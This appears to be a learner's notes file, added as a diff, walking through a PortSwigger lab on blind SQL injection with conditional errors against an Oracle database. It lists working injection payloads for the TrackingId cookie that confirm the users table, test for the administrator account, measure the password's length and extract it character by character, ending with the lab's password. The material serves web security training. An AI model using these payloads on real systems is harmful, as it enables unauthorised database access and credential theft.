@@ -1,0 +1,37 @@
+link: https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors
+
+
+step 0:
+    TrackingId=O4QpMTFOwkPZG9hC' --> error
+
+step 1: Confirm that the parameter is vulnerable 
+
+    => '||(select '' from dual)||' --> oracle database
+        *dual is a dummy table in oracel database*
+
+    => '||(select '' from dualss)||' --> oracle database
+
+step 2: Confirm that users table
+
+    => '|| (select '' from users where rownum=1) || '
+
+step 3: confirm that the Administrator user exists in th users database
+    => '|| (select '' from users where username='administrator') || '
+
+    -> find wheather administrator exists or not
+
+    > Case in sql to
+    => '|| (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) ||'
+
+    => '||(select CASE WHEN (1=1) THEN to_Char(1/0) ELSE '' END from users where username='administrator')||'
+    *found username administrator*
+
+step 4: determine length of password
+    '||(select CASE WHEN (1=1) THEN to_Char(1/0) ELSE '' END from users where username='administrator' and LENGTH(password)>1)||'
+
+    length of password is 20
+
+step 5: Output admin password
+    '||(select CASE WHEN (1=1) THEN to_Char(1/0) ELSE '' END from users where username='administrator' and substr(password,1,1)='a')||'
+
+    4bzz4mscea2vol3upevn
